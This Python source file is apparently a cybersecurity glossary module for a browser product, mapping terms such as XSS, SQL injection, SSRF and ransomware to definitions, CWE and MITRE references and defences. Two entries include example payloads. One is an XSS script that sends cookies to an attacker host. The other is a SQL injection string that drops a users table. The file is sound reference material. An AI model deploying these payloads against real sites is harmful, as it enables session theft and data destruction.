"""
Cybersecurity Knowledge Base & Terminology Engine for Aegis Safe Browser.
Contains exhaustive cybersecurity definitions, attack patterns, defensive controls,
MITRE ATT&CK mappings, and vulnerability signatures.
"""

from typing import Dict, Any, List, Optional
import re

CYBER_TERMS: Dict[str, Dict[str, Any]] = {
    # --- WEB APPLICATION & VULNERABILITIES ---
    "xss": {
        "title": "Cross-Site Scripting (XSS)",
        "acronym": "XSS",
        "category": "Web Security",
        "cwe": "CWE-79",
        "owasp": "A03:2021 - Injection",
        "definition": "A vulnerability where an attacker injects malicious client-side script into web pages viewed by other users.",
        "types": ["Reflected XSS", "Stored (Persistent) XSS", "DOM-based XSS"],
        "mechanics": "Occurs when untrusted data is included in dynamic web pages without validation or context-aware encoding. The malicious script runs within the victim's browser session, allowing cookie theft, session hijacking, or malicious redirection.",
        "prevention": [
            "Context-aware output encoding (HTML, JavaScript, CSS, URL contexts)",
            "Enforce a strict Content Security Policy (CSP) with nonce-based or hash-based script sources",
            "Use HttpOnly flag on authentication session cookies",
            "Adopt modern frontend frameworks (React, Angular) that auto-escape bindings",
            "Sanitize HTML input using DOMPurify before rendering raw HTML"
        ],
        "mitre_technique": "T1189 (Drive-by Compromise) / T1059.007 (JavaScript)",
        "example_payload": "<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>"
    },
    "sqli": {
        "title": "SQL Injection (SQLi)",
        "acronym": "SQLi",
        "category": "Injection & Database Security",
        "cwe": "CWE-89",
        "owasp": "A03:2021 - Injection",
        "definition": "A code injection attack where malicious SQL queries are submitted into entry fields to execute arbitrary database commands.",
        "types": ["In-band (Classic/Union-based/Error-based)", "Inferential (Blind/Boolean/Time-based)", "Out-of-band (OOB)"],
        "mechanics": "Attacker manipulates SQL query syntax via untrusted user inputs that are concatenated directly into SQL command strings without parameterization.",
        "prevention": [
            "Use Parameterized Queries / Prepared Statements exclusively (e.g. PDO, PreparedStatement, ORM)",
            "Apply the Principle of Least Privilege to database connection accounts",
            "Deploy Web Application Firewalls (WAF) to filter SQLi signatures",
            "Avoid database error message leakage to client side"
        ],
        "mitre_technique": "T1190 (Exploit Public-Facing Application)",
        "example_payload": "' OR 1=1; DROP TABLE users; --"
    },
    "csrf": {
        "title": "Cross-Site Request Forgery (CSRF)",
        "acronym": "CSRF / XSRF",
        "category": "Web Security",
        "cwe": "CWE-352",
        "owasp": "A01:2021 - Broken Access Control",
        "definition": "An attack that forces an authenticated end-user to execute unwanted actions on a web application in which they are currently authenticated.",
        "mechanics": "Exploits the browser's automatic inclusion of ambient credentials (session cookies, basic auth) with cross-origin HTTP requests without checking the origin's intent.",
        "prevention": [
            "Implement Anti-CSRF Synchronizer Tokens (validated on state-changing POST/PUT/DELETE requests)",
            "Enforce SameSite=Strict or SameSite=Lax cookie attribute on session cookies",
            "Verify Origin and Referer HTTP request headers on the backend",
            "Require re-authentication or biometric step-up for sensitive transactions"
        ],
        "mitre_technique": "T1204.001 (User Execution: Malicious Link)"
    },
    "ssrf": {
        "title": "Server-Side Request Forgery (SSRF)",
        "acronym": "SSRF",
        "category": "Cloud & Server Security",
        "cwe": "CWE-918",
        "owasp": "A10:2021 - Server-Side Request Forgery",
        "definition": "A vulnerability allowing an attacker to induce the server-side application to make HTTP/TCP requests to an arbitrary domain of the attacker's choosing.",
        "mechanics": "Exploits server functionality that fetches remote resources (e.g., file import, URL preview, webhook). Attackers target internal services (127.0.0.1, AWS/GCP metadata endpoints: 169.254.169.254) hidden behind firewalls.",
        "prevention": [
            "Sanitize and strictly whitelist destination domains and IP schemes",
            "Disable parsing of HTTP redirects when fetching remote resources",
            "Block access to loopback (127.0.0.0/8) and private IP ranges (RFC 1918: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)",
            "Use IMDSv2 on AWS (requires session tokens for metadata access)"
        ],
        "mitre_technique": "T1190 (Exploit Public-Facing Application)"
    },
    "idor": {
        "title": "Insecure Direct Object Reference (IDOR)",
        "acronym": "IDOR",
        "category": "Access Control",
        "cwe": "CWE-639",
        "owasp": "A01:2021 - Broken Access Control",
        "definition": "A vulnerability where an application uses user-supplied input to access database records or files directly without validating user authorization.",
        "mechanics": "Occurs when a parameter like '?user_id=105' can be modified to '?user_id=106' and the server returns record 106 without verifying ownership or RBAC permission.",
        "prevention": [
            "Enforce server-side record-level authorization checks on every data access query",
            "Use indirect reference maps or non-sequential GUIDs/UUIDs v4 instead of incremental integer IDs",
            "Implement strict Object-Level Permissions in business logic layers"
        ],
        "mitre_technique": "T1078 (Valid Accounts)"
    },
    "rce": {
        "title": "Remote Code Execution (RCE)",
        "acronym": "RCE",
        "category": "Critical Exploits",
        "cwe": "CWE-94 / CWE-78",
        "definition": "A critical vulnerability that allows an attacker to execute arbitrary shell commands or code on a target machine over the network.",
        "mechanics": "Results from unsafe deserialization, OS command injection, template injection (SSTI), buffer overflows, or vulnerable dependencies (e.g. Log4j / CVE-2021-44228).",
        "prevention": [
            "Never invoke system shells (e.g., os.system, exec, eval) with untrusted parameters",
            "Sandbox application runtimes using unprivileged containers and seccomp/AppArmor",
            "Apply zero-day security patches and continuous software bill of materials (SBOM) scanning",
            "Run services under dedicated non-root service accounts"
        ],
        "mitre_technique": "T1059 (Command and Scripting Interpreter)"
    },

    # --- NETWORK & PROTOCOL DEFENSES ---
    "doh": {
        "title": "DNS over HTTPS (DoH)",
        "acronym": "DoH",
        "category": "Network & Privacy Protocols",
        "rfc": "RFC 8484",
        "definition": "A cryptographic protocol for performing remote Domain Name System (DNS) resolution via encrypted HTTPS connections.",
        "mechanics": "Wraps DNS queries inside standard TLS encrypted HTTP/2 or HTTP/3 traffic on port 443, preventing eavesdropping and tampering by local ISPs, public Wi-Fi operators, or rogue middleboxes.",
        "advantages": [
            "Defeats DNS spoofing and cache poisoning attacks",
            "Shields user browsing habits from ISP surveillance and DNS-based censorship",
            "Operates over standard port 443 alongside regular HTTPS traffic"
        ],
        "considerations": "Bypasses legacy local network DNS sinkholes and enterprise filtering unless centralized DoH policies are deployed."
    },
    "dns_origin": {
        "title": "DNS Origin Server & Origin IP Shielding",
        "acronym": "Origin Shielding",
        "category": "Perimeter Defense & CDN Architecture",
        "definition": "An Origin Server is the backend physical server or cluster where web applications execute and data resides, situated behind edge reverse proxies (such as Cloudflare, Fastly, Akamai, or AWS CloudFront). The DNS Origin maps the domain directly to the actual origin host machine IP.",
        "mechanics": "When reverse proxy CDNs are enabled, public DNS A/AAAA records resolve to CDN anycast edge IP addresses. The edge proxy receives client traffic, performs WAF filtering and caching, and proxies legitimate requests to the origin server. However, if the origin IP is leaked in historical DNS records, MX records, or SPF headers, attackers bypass the CDN entirely.",
        "threat_vectors": [
            "Direct-to-Origin DDoS: Flooding the origin server IP directly to bypass CDN traffic scrubbing centers.",
            "WAF Bypass: Direct HTTP requests to the origin machine completely skip edge Web Application Firewall rules.",
            "Historical DNS Reconnaissance: Querying historical DNS archives (SecurityTrails, Censys, Shodan) to find previous pre-CDN A records."
        ],
        "defense": [
            "Zero Open Inbound Ports: Deploy tunnel daemons (Cloudflare Argo Tunnel / cloudflared, AWS PrivateLink) with no listening public ports.",
            "Ingress Firewall Whitelisting: Restrict incoming firewall traffic on ports 80/443 strictly to CDN IP CIDRs.",
            "Authenticated Origin Pulls (mTLS): Enforce mutual TLS authentication requiring CDN client certificates on the web server."
        ]
    },
    "dnssec": {
        "title": "Domain Name System Security Extensions (DNSSEC)",
        "acronym": "DNSSEC",
        "category": "DNS Cryptography",
        "rfc": "RFC 4033 / RFC 4034 / RFC 4035",
        "definition": "A suite of cryptographic extensions that provides DNS clients origin authentication, authenticated denial of existence, and data integrity verification.",
        "mechanics": "Uses public key cryptography to digitally sign DNS resource records (RRSIG, DNSKEY, DS records). Validating resolvers verify signatures back to the ICANN root trust anchor.",
        "protection": "Protects against DNS cache poisoning, Kaminsky attacks, and forged response records."
    },
    "hsts": {
        "title": "HTTP Strict Transport Security (HSTS)",
        "acronym": "HSTS",
        "category": "Transport Layer Security",
        "rfc": "RFC 6797",
        "definition": "A web security header that informs compliant browsers that the website must only be accessed using HTTPS, refusing unencrypted HTTP connections.",
        "mechanics": "Browser caches the 'Strict-Transport-Security: max-age=31536000; includeSubDomains; preload' directive, converting all http:// links to https:// before sending requests.",
        "protection": "Prevents SSL/TLS stripping attacks (e.g., SSLsplit, Moxie Marlinspike's SSLstrip) and downgrade exploits."
    },
    "csp": {
        "title": "Content Security Policy (CSP)",
        "acronym": "CSP",
        "category": "Browser Security Standards",
        "definition": "An HTTP response header that restricts the resources (scripts, images, frames) that the browser is allowed to load for a given page.",
        "mechanics": "Server sends 'Content-Security-Policy: default-src \\'self\\'; script-src \\'self\\' \\'nonce-...\\'', disallowing inline script execution and unapproved third-party origins.",
        "protection": "Primary mitigation against Cross-Site Scripting (XSS), clickjacking, and packet injection."
    },
    "bgp_hijacking": {
        "title": "BGP Hijacking (Border Gateway Protocol Hijacking)",
        "acronym": "BGP Hijacking",
        "category": "Internet Infrastructure",
        "definition": "Illegitimate takeover of groups of IP addresses by corrupting Internet routing tables maintained using Border Gateway Protocol.",
        "mechanics": "A rogue Autonomous System (AS) announces falsified prefix routes with more specific netmasks or shorter AS-paths, diverting global network traffic through malicious transit nodes for interception or blackholing.",
        "defense": ["RPKI (Resource Public Key Infrastructure) Route Origin Authorization (ROA)", "BGPsec", "Peer-locking"]
    },

    # --- MALWARE & THREAT ACTORS ---
    "ransomware": {
        "title": "Ransomware",
        "category": "Malware & Cybercrime",
        "definition": "A class of malicious software that encrypts a victim's files, databases, or operating system, demanding a ransom payment for the decryption key.",
        "tactics": [
            "Double Extortion: Encrypting local files while exfiltrating sensitive intellectual property to leak sites",
            "Triple Extortion: Encrypting files, leaking data, and launching DDoS attacks against business partners or customers"
        ],
        "common_families": ["LockBit", "BlackCat (ALPHV)", "WannaCry", "Conti", "Ryuk", "DarkSide"],
        "defense": [
            "Immutable, air-gapped backups (3-2-1 backup rule)",
            "Endpoint Detection and Response (EDR) with automated behavioral isolation",
            "Principle of Least Privilege and network segmentation (Zero Trust micro-perimeters)",
            "Disable legacy SMBv1 and enforce multi-factor authentication (MFA) on all VPN/RDP portals"
        ]
    },
    "phishing": {
        "title": "Phishing & Social Engineering",
        "category": "Social Engineering & Deception",
        "definition": "Fraudulent communication designed to deceive victims into revealing sensitive credentials, installing malware, or authorizing unauthorized wire transfers.",
        "variants": [
            "Spear Phishing: Tailored targeting of specific high-profile individuals",
            "Whaling: Targeting executive leadership (C-suite)",
            "Smishing & Vishing: SMS-based and voice-based pretexting attacks",
            "Clone Phishing: Cloned legitimate transactional emails with weaponized links/attachments"
        ],
        "indicators": ["Lookalike/punycode domains", "Urgency pretexts", "Mismatched SPF/DKIM/DMARC email records"],
        "defense": ["FIDO2 / WebAuthn hardware security keys (phishing-resistant MFA)", "Strict DMARC policy (p=reject)", "Security awareness training"]
    },
    "apt": {
        "title": "Advanced Persistent Threat (APT)",
        "acronym": "APT",
        "category": "Threat Intelligence",
        "definition": "A stealthy threat actor, typically a nation-state or state-sponsored group, that gains unauthorized long-term access to a computer network.",
        "characteristics": [
            "Extended dwell time (months to years) conducting espionage or strategic positioning",
            "Use of bespoke custom zero-day exploits and living-off-the-land binaries (LOLBAS)",
            "Redundant Command & Control (C2) infrastructure with encrypted covert channels"
        ],
        "examples": ["APT28 (Fancy Bear)", "APT29 (Cozy Bear)", "APT41 (Wicked Panda)", "Lazarus Group (North Korea)"]
    },
    "zero_day": {
        "title": "Zero-Day Vulnerability & Exploit",
        "acronym": "0-Day",
        "category": "Vulnerability Intelligence",
        "definition": "A software security flaw unknown to the software vendor or public, for which no official security patch or mitigation exists.",
        "lifecycle": "Discovery -> Weaponization / Exploit development -> In-the-wild exploitation -> Detection / Disclosure -> Patch release (Day 1).",
        "mitigation": ["Heuristic and behavioral sandboxing", "Virtual patching via WAF / IPS rules", "Defense in depth and memory-safe languages (Rust)"]
    },
    "rootkit": {
        "title": "Rootkit",
        "category": "Malware & Kernel Security",
        "definition": "A collection of software tools that enables an unauthorized user to gain control of a computer system without being detected.",
        "types": ["Kernel-mode rootkits", "Hypervisor-level rootkits", "Firmware/UEFI rootkits", "User-mode rootkits"],
        "mechanics": "Hooks OS system calls, modifies kernel data structures (DKOM), or infects UEFI firmware to hide processes, network ports, and files from detection tools."
    },

    # --- CRYPTOGRAPHY & CIPHERS ---
    "aes": {
        "title": "Advanced Encryption Standard (AES)",
        "acronym": "AES / Rijndael",
        "category": "Symmetric Cryptography",
        "fips": "FIPS 197",
        "definition": "A symmetric block cipher chosen by the U.S. government to protect classified information worldwide.",
        "key_sizes": "128, 192, and 256 bits (Block size: 128 bits)",
        "modes": [
            "AES-GCM (Galois/Counter Mode): Authenticated encryption with associated data (AEAD) - Recommended",
            "AES-CBC: Cipher Block Chaining (susceptible to padding oracle attacks if improperly implemented)",
            "AES-ECB: Electronic Codebook (Insecure - preserves plain-text data patterns)"
        ]
    },
    "rsa": {
        "title": "Rivest-Shamir-Adleman (RSA)",
        "acronym": "RSA",
        "category": "Asymmetric Cryptography",
        "definition": "A public-key cryptosystem widely used for secure data transmission and digital signatures based on the practical difficulty of factoring the product of two large prime numbers.",
        "key_recommendation": "Minimum 2048-bit (3072-bit or 4096-bit recommended by NIST for modern deployments).",
        "quantum_threat": "Shor's algorithm running on a cryptographically relevant quantum computer (CRQC) can factor RSA keys in polynomial time."
    },
    "ecc": {
        "title": "Elliptic Curve Cryptography (ECC)",
        "acronym": "ECC",
        "category": "Asymmetric Cryptography",
        "definition": "An approach to public-key cryptography based on the algebraic structure of elliptic curves over finite fields.",
        "advantages": "Yields equivalent cryptographic security to RSA with significantly smaller key sizes (e.g. 256-bit ECC matches 3072-bit RSA), reducing CPU and bandwidth overhead.",
        "common_curves": ["Curve25519 (Ed25519 signatures, X25519 key exchange)", "NIST P-256 (secp256r1)", "secp256k1 (Bitcoin/Ethereum)"]
    },
    "pqc": {
        "title": "Post-Quantum Cryptography (PQC)",
        "acronym": "PQC",
        "category": "Quantum Defense",
        "definition": "Cryptographic algorithms thought to be secure against a cryptanalytic attack by a quantum computer.",
        "nist_standards": [
            "ML-KEM (FIPS 203, based on CRYSTALS-Kyber) for general encryption / key encapsulation",
            "ML-DSA (FIPS 204, based on CRYSTALS-Dilithium) for digital signatures",
            "SLH-DSA (FIPS 205, based on SPHINCS+) for stateless hash-based digital signatures"
        ]
    },
    "zero_trust": {
        "title": "Zero Trust Architecture (ZTA)",
        "acronym": "Zero Trust / ZTA",
        "category": "Security Frameworks",
        "standard": "NIST SP 800-207",
        "definition": "A cybersecurity paradigm centered on the belief that organizations should not automatically trust anything inside or outside its perimeters.",
        "core_tenets": [
            "Never Trust, Always Verify",
            "Assume Breach",
            "Verify Explicitly (continuous contextual authentication & device posture assessment)",
            "Apply Least Privilege Access via Micro-segmentation"
        ]
    },
    "mitre_attack": {
        "title": "MITRE ATT&CK Matrix",
        "acronym": "ATT&CK",
        "category": "Threat Frameworks",
        "definition": "A globally-accessible knowledge base of adversary tactics and techniques based on real-world cyber observations.",
        "tactics": [
            "Reconnaissance (TA0043)",
            "Resource Development (TA0042)",
            "Initial Access (TA0001)",
            "Execution (TA0002)",
            "Persistence (TA0003)",
            "Privilege Escalation (TA0004)",
            "Defense Evasion (TA0005)",
            "Credential Access (TA0006)",
            "Discovery (TA0007)",
            "Lateral Movement (TA0008)",
            "Collection (TA0009)",
            "Command and Control (TA0011)",
            "Exfiltration (TA0010)",
            "Impact (TA0040)"
        ]
    },
    "siem": {
        "title": "Security Information and Event Management (SIEM)",
        "acronym": "SIEM",
        "category": "Security Operations (SOC)",
        "definition": "A security solution that aggregates, correlates, and analyzes log and event data from across an enterprise's infrastructure in real time.",
        "key_features": ["Centralized log ingestion", "Cross-system event correlation", "Real-time threat alerting", "Compliance audit reporting"],
        "examples": ["Splunk", "Elastic Security", "Microsoft Sentinel", "IBM QRadar"]
    },
    "soar": {
        "title": "Security Orchestration, Automation, and Response (SOAR)",
        "acronym": "SOAR",
        "category": "Security Operations (SOC)",
        "definition": "Software technologies enabling organizations to collect security inputs and orchestrate incident response workflows via automated playbooks."
    },
    "edr": {
        "title": "Endpoint Detection and Response (EDR / XDR)",
        "acronym": "EDR / XDR",
        "category": "Endpoint Defense",
        "definition": "An integrated endpoint security solution that combines continuous real-time monitoring and collection of endpoint data with rules-based automated response and analysis.",
        "examples": ["CrowdStrike Falcon", "Microsoft Defender for Endpoint", "SentinelOne Singularity"]
    },
    "honeypot": {
        "title": "Honeypot & Deception Technology",
        "category": "Active Defense",
        "definition": "A decoy system or network resource intentionally exposed to attackers to bait, trap, detect, and analyze cyber attack methodologies.",
        "types": ["Low-interaction honeypots (emulate minimal services)", "High-interaction honeypots (full operating systems for deep forensic capture)"]
    },
    "cve": {
        "title": "Common Vulnerabilities and Exposures (CVE)",
        "acronym": "CVE",
        "category": "Vulnerability Catalog",
        "definition": "A standardized identifier system for publicly known cybersecurity vulnerabilities, managed by the MITRE Corporation and CISA.",
        "format": "CVE-YYYY-NNNNN (e.g. CVE-2021-44228 for Log4Shell)"
    },
    "cwe": {
        "title": "Common Weakness Enumeration (CWE)",
        "acronym": "CWE",
        "category": "Software Assurance",
        "definition": "A community-developed taxonomy of hardware and software weakness types, serving as a baseline for identification, mitigation, and prevention."
    },
    "cvss": {
        "title": "Common Vulnerability Scoring System (CVSS)",
        "acronym": "CVSS",
        "category": "Vulnerability Scoring",
        "version": "CVSS v3.1 / CVSS v4.0",
        "definition": "A standardized framework for assessing the severity of computer system security vulnerabilities.",
        "severity_ratings": {
            "None": "0.0",
            "Low": "0.1 - 3.9",
            "Medium": "4.0 - 6.9",
            "High": "7.0 - 8.9",
            "Critical": "9.0 - 10.0"
        }
    },
    "ddos": {
        "title": "Distributed Denial of Service (DDoS)",
        "acronym": "DDoS",
        "category": "Network Availability Attacks",
        "definition": "A cyber attack in which multiple compromised computer systems attack a target server, website, or network resource, causing a denial of service for users.",
        "attack_layers": [
            "Layer 3/4 (Volumetric): UDP Floods, NTP/DNS Amplification, SYN Floods, ICMP Smurf attacks",
            "Layer 7 (Application): HTTP GET/POST Floods, Slowloris, API resource exhaustion"
        ],
        "mitigation": ["Anycast BGP routing networks (Cloudflare, Akamai)", "SYN cookies", "Rate limiting and challenge-response (CAPTCHA/Proof of Work)"]
    },
    "buffer_overflow": {
        "title": "Buffer Overflow (Smashing the Stack)",
        "category": "Binary & Memory Exploitation",
        "cwe": "CWE-121 (Stack-based) / CWE-122 (Heap-based)",
        "definition": "An anomaly where a program writes data beyond the allocated buffer boundaries, corrupting adjacent memory and potentially hijacking control flow.",
        "mitigations": [
            "Stack Canaries / Cookies (/GS, -fstack-protector)",
            "Address Space Layout Randomization (ASLR)",
            "Data Execution Prevention (DEP / NX bit - No-Execute)",
            "Control Flow Guard (CFG) and SafeSEH",
            "Transition to memory-safe languages (Rust, Go, Swift)"
        ]
    },
    "osint": {
        "title": "Open Source Intelligence (OSINT)",
        "acronym": "OSINT",
        "category": "Reconnaissance & Intelligence",
        "definition": "The collection and analysis of data gathered from open, publicly available sources to produce actionable intelligence for threat hunting or penetration testing.",
        "tools": ["Shodan", "Censys", "theHarvester", "Maltego", "crt.sh (Certificate Transparency logs)", "Whois"]
    },
    "ioc": {
        "title": "Indicator of Compromise (IoC)",
        "acronym": "IoC",
        "category": "Forensics & Incident Response",
        "definition": "Forensic evidence of potential intrusion or malicious activity on a host system or network.",
        "pyramid_of_pain": [
            "Trivial: Hash values (MD5, SHA256)",
            "Easy: IP Addresses",
            "Simple: Domain Names",
            "Annoying: Network & Host Artifacts",
            "Challenging: Tools",
            "Tough: TTPs (Tactics, Techniques, and Procedures)"
        ]
    },
    "mfa": {
        "title": "Multi-Factor Authentication (MFA / 2FA)",
        "acronym": "MFA / FIDO2",
        "category": "Identity & Access Management",
        "definition": "An electronic authentication method in which a user is granted access to a website or application only after successfully presenting two or more pieces of evidence.",
        "factors": [
            "Something you know (Password, PIN)",
            "Something you have (FIDO2 Hardware Key, TOTP Authenticator App, Smart Card)",
            "Something you are (Biometrics: Fingerprint, Facial Recognition, Retina)"
        ],
        "phishing_resistance": "FIDO2 / WebAuthn with public-key cryptography and origin binding is cryptographically phishing-resistant, unlike SMS or voice OTP codes."
    },
    "waf": {
        "title": "Web Application Firewall (WAF)",
        "acronym": "WAF",
        "category": "Perimeter Defense",
        "definition": "A specialized application firewall that monitors, filters, and blocks HTTP/HTTPS traffic to and from a web application.",
        "features": ["Protection against OWASP Top 10", "DDoS rate limiting", "Virtual patching of zero-day exploits", "Bot management and credential stuffing mitigation"]
    },
    "ids_ips": {
        "title": "Intrusion Detection and Prevention Systems (IDS / IPS)",
        "acronym": "IDS / IPS",
        "category": "Network Defense",
        "definition": "Network security appliances or software tools that inspect packet flows to detect (IDS) and actively block (IPS) unauthorized intrusions or exploits.",
        "detection_modes": ["Signature-based detection (known CVE signatures, Snort/Suricata rules)", "Anomaly-based detection (heuristics and behavioral baselines)"]
    },
    "clickjacking": {
        "title": "Clickjacking (UI Redressing)",
        "category": "Client-Side Attacks",
        "cwe": "CWE-1021",
        "definition": "A malicious technique of tricking a user into clicking on something different from what the user perceives, by rendering the target page inside an invisible iframe.",
        "defense": [
            "HTTP Response Header: 'X-Frame-Options: DENY' or 'SAMEORIGIN'",
            "CSP Directive: 'frame-ancestors \\'none\\'' or 'frame-ancestors \\'self\\''"
        ]
    },
    "cors": {
        "title": "Cross-Origin Resource Sharing (CORS) Misconfiguration",
        "acronym": "CORS",
        "category": "Web API Security",
        "cwe": "CWE-942",
        "definition": "A security flaw where server-side CORS headers are excessively permissive, allowing unauthorized third-party origins to access authenticated API endpoints.",
        "vulnerable_patterns": [
            "Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true (rejected by browsers)",
            "Reflecting arbitrary Origin headers from requests without strict whitelisting",
            "Trusting 'null' origin (susceptible to iframe sandbox exploits)"
        ],
        "defense": "Maintain a strict, hard-coded whitelist of trusted client origins and validate the exact domain."
    },
    "xxe": {
        "title": "XML External Entity (XXE) Injection",
        "acronym": "XXE",
        "category": "Application Security",
        "cwe": "CWE-611",
        "definition": "A vulnerability against applications that parse XML input without disabling external entity references, allowing attackers to view files on the server or trigger SSRF.",
        "defense": "Completely disable Document Type Definitions (DTDs) and external entity resolution in XML parsers."
    },
    "ssti": {
        "title": "Server-Side Template Injection (SSTI)",
        "acronym": "SSTI",
        "category": "Injection & RCE",
        "cwe": "CWE-1336",
        "definition": "A vulnerability occurring when user input is embedded directly into a template engine (Jinja2, Twig, Freemarker) instead of being passed as a variable.",
        "mechanics": "Attackers inject template expressions like {{7*7}} to verify injection, then traverse class hierarchies (e.g. MRO in Python) to execute arbitrary OS commands.",
        "defense": "Never concatenate user input directly into template strings; pass data strictly into template context variables."
    },
    "mitm": {
        "title": "Man-in-the-Middle (MitM) / On-Path Attack",
        "acronym": "MitM / On-Path",
        "category": "Network Interception",
        "definition": "An attack where the adversary secretly intercepts and relays communications between two parties who believe they are directly communicating with each other.",
        "vectors": ["ARP Poisoning / Spoofing", "Rogue Access Points (Evil Twin Wi-Fi)", "DNS Cache Poisoning", "BGP Route Leakage"],
        "defense": ["Mandatory mutual TLS / TLS 1.3 encryption", "Certificate Pinning", "Static ARP tables or Dynamic ARP Inspection (DAI)", "HSTS Preloading"]
    },
    "arp_spoofing": {
        "title": "Address Resolution Protocol (ARP) Spoofing / Poisoning",
        "category": "Local Network Attacks",
        "cwe": "CWE-300",
        "definition": "A local layer 2 network attack where an attacker sends falsified ARP messages over a local area network to link their MAC address with the IP of a legitimate gateway.",
        "defense": ["Dynamic ARP Inspection (DAI) on managed switches", "Static ARP bindings", "802.1X Network Access Control"]
    },
    "pass_the_hash": {
        "title": "Pass-the-Hash (PtH) & Kerberoasting",
        "category": "Credential Access & Lateral Movement",
        "mitre_technique": "T1550.002",
        "definition": "An attack technique where an adversary steals a hashed user credential (e.g., NTLM hash) and re-uses it directly to authenticate over the network without cracking it.",
        "defense": [
            "Disable NTLM and transition fully to Kerberos with AES-256",
            "Enable Credential Guard in Windows 10/11 and Windows Server",
            "Enforce LAPS (Local Administrator Password Solution) to eliminate shared local administrator passwords",
            "Implement Tiered Administrative Architecture (Red Forest / Enterprise Access Model)"
        ]
    },
    "supply_chain": {
        "title": "Software Supply Chain Attack",
        "category": "Ecosystem & CI/CD Security",
        "definition": "A cyberattack that targets vulnerabilities in third-party software, open-source dependencies, vendor updates, or build pipelines to compromise downstream users.",
        "famous_incidents": ["SolarWinds Orion (Sunburst)", "XZ Utils Backdoor (CVE-2024-3094)", "Codecov bash uploader breach"],
        "defense": [
            "Software Bill of Materials (SBOM) generation and automated vulnerability tracking",
            "Dependency lockfiles with cryptographic hash verification",
            "Isolated, reproducible build pipelines with SLSA framework compliance",
            "Multi-signature code signing and binary transparency"
        ]
    },
    "nist_csf": {
        "title": "NIST Cybersecurity Framework (CSF 2.0)",
        "acronym": "NIST CSF",
        "category": "Governance & Compliance",
        "definition": "A voluntary framework of computer security guidance for organizations to assess and improve their ability to prevent, detect, and respond to cyber attacks.",
        "six_core_functions": [
            "1. GOVERN: Establish cybersecurity risk management strategy, policies, and roles.",
            "2. IDENTIFY: Understand cybersecurity risks to systems, assets, data, and capabilities.",
            "3. PROTECT: Safeguard critical services through identity access, data security, and training.",
            "4. DETECT: Pinpoint cybersecurity events through continuous monitoring and anomaly detection.",
            "5. RESPOND: Take action regarding detected incidents (containment, communication, mitigation).",
            "6. RECOVER: Restore capabilities and impaired assets with resilience plans."
        ]
    },
    "pci_dss": {
        "title": "Payment Card Industry Data Security Standard (PCI-DSS 4.0)",
        "acronym": "PCI-DSS",
        "category": "Regulatory Compliance",
        "definition": "A global information security standard mandated by major credit card brands for all entities that store, process, or transmit cardholder data.",
        "core_goals": [
            "Build and maintain a secure network and systems",
            "Protect cardholder account data with strong encryption at rest and in transit",
            "Maintain a vulnerability management program (patching, anti-malware)",
            "Implement strong access control measures (unique IDs, MFA for all administrative access)",
            "Regularly monitor and test networks (logging, penetration testing, ASV scans)",
            "Maintain an information security policy"
        ]
    }
}

# Synonyms and alias mapping for fast natural language matching
TERM_ALIASES: Dict[str, str] = {
    "xss": "xss",
    "cross site scripting": "xss",
    "cross-site scripting": "xss",
    "stored xss": "xss",
    "dom xss": "xss",
    "reflected xss": "xss",
    "sqli": "sqli",
    "sql injection": "sqli",
    "sql-injection": "sqli",
    "database injection": "sqli",
    "csrf": "csrf",
    "xsrf": "csrf",
    "cross site request forgery": "csrf",
    "cross-site request forgery": "csrf",
    "ssrf": "ssrf",
    "server side request forgery": "ssrf",
    "server-side request forgery": "ssrf",
    "idor": "idor",
    "insecure direct object reference": "idor",
    "broken access control": "idor",
    "rce": "rce",
    "remote code execution": "rce",
    "command injection": "rce",
    "doh": "doh",
    "dns over https": "doh",
    "dns-over-https": "doh",
    "dns origin": "dns_origin",
    "origin server": "dns_origin",
    "origin ip": "dns_origin",
    "origin shielding": "dns_origin",
    "dnssec": "dnssec",
    "dns security extensions": "dnssec",
    "hsts": "hsts",
    "strict transport security": "hsts",
    "csp": "csp",
    "content security policy": "csp",
    "bgp": "bgp_hijacking",
    "bgp hijacking": "bgp_hijacking",
    "ransomware": "ransomware",
    "extortionware": "ransomware",
    "lockbit": "ransomware",
    "phishing": "phishing",
    "spear phishing": "phishing",
    "smishing": "phishing",
    "vishing": "phishing",
    "apt": "apt",
    "advanced persistent threat": "apt",
    "zero day": "zero_day",
    "zero-day": "zero_day",
    "0day": "zero_day",
    "0-day": "zero_day",
    "rootkit": "rootkit",
    "aes": "aes",
    "symmetric encryption": "aes",
    "aes-gcm": "aes",
    "rsa": "rsa",
    "asymmetric encryption": "rsa",
    "public key cryptography": "rsa",
    "ecc": "ecc",
    "elliptic curve": "ecc",
    "curve25519": "ecc",
    "pqc": "pqc",
    "post quantum": "pqc",
    "post-quantum": "pqc",
    "kyber": "pqc",
    "dilithium": "pqc",
    "zero trust": "zero_trust",
    "zta": "zero_trust",
    "mitre": "mitre_attack",
    "att&ck": "mitre_attack",
    "mitre attack": "mitre_attack",
    "siem": "siem",
    "splunk": "siem",
    "soar": "soar",
    "edr": "edr",
    "xdr": "edr",
    "honeypot": "honeypot",
    "cve": "cve",
    "cwe": "cwe",
    "cvss": "cvss",
    "ddos": "ddos",
    "dos": "ddos",
    "denial of service": "ddos",
    "buffer overflow": "buffer_overflow",
    "stack overflow": "buffer_overflow",
    "osint": "osint",
    "open source intelligence": "osint",
    "ioc": "ioc",
    "indicator of compromise": "ioc",
    "mfa": "mfa",
    "2fa": "mfa",
    "multi factor authentication": "mfa",
    "multi-factor authentication": "mfa",
    "fido2": "mfa",
    "webauthn": "mfa",
    "passkey": "mfa",
    "waf": "waf",
    "web application firewall": "waf",
    "ids": "ids_ips",
    "ips": "ids_ips",
    "intrusion detection": "ids_ips",
    "clickjacking": "clickjacking",
    "ui redressing": "clickjacking",
    "cors": "cors",
    "cross origin resource sharing": "cors",
    "xxe": "xxe",
    "xml external entity": "xxe",
    "ssti": "ssti",
    "server side template injection": "ssti",
    "template injection": "ssti",
    "mitm": "mitm",
    "man in the middle": "mitm",
    "arp spoofing": "arp_spoofing",
    "arp poisoning": "arp_spoofing",
    "pass the hash": "pass_the_hash",
    "pth": "pass_the_hash",
    "kerberoasting": "pass_the_hash",
    "supply chain": "supply_chain",
    "supply chain attack": "supply_chain",
    "nist csf": "nist_csf",
    "nist": "nist_csf",
    "pci dss": "pci_dss",
    "pci-dss": "pci_dss"
}

def find_matching_terms(query: str) -> List[Dict[str, Any]]:
    """Scan query string for cybersecurity terms and return structured entries."""
    query_lower = query.lower()
    matched_keys = set()
    
    # 1. Direct alias match
